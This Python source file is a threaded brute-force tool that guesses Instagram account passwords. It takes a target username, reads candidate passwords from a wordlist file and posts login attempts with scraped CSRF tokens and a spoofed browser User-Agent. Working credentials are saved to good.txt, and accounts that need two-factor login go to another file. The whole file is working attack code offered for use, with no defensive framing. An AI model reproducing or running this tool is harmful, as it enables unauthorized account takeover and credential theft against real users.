import re
from datetime import datetime
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
import typer 
from tabulate import tabulate

class default_start(object):
    def __init__(self):

        try:
            user = typer.prompt(typer.style("Enter a username",fg=typer.colors.BRIGHT_GREEN))
            Combo = "default_w.txt"
            with typer.progressbar(range(10)) as sp:
                for i in sp:
                    time.sleep(0.1)

        except:
            print(' The tool was arrested exit ')
            sys.exit()

        with open("default_w.txt", 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            x_table = [
                    [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacking...",fg=typer.colors.RED)]
            ]
            print(tabulate(x_table,tablefmt="psql"))

            if 'authenticated": true' in r.text:
                pass_table=[
                        [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacked. Password is Helper/good.txt",fg=typer.colors.CYAN)]
                ]
                print(tabulate(pass_table,tablefmt="psql"))
                
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                pass_table=[
                        [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Problem. Password is Helper/results_NeedVerfiy.txt.",fg=typer.colors.CYAN)]
                ]
                print(tabulate(pass_table,tablefmt='psql'))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')


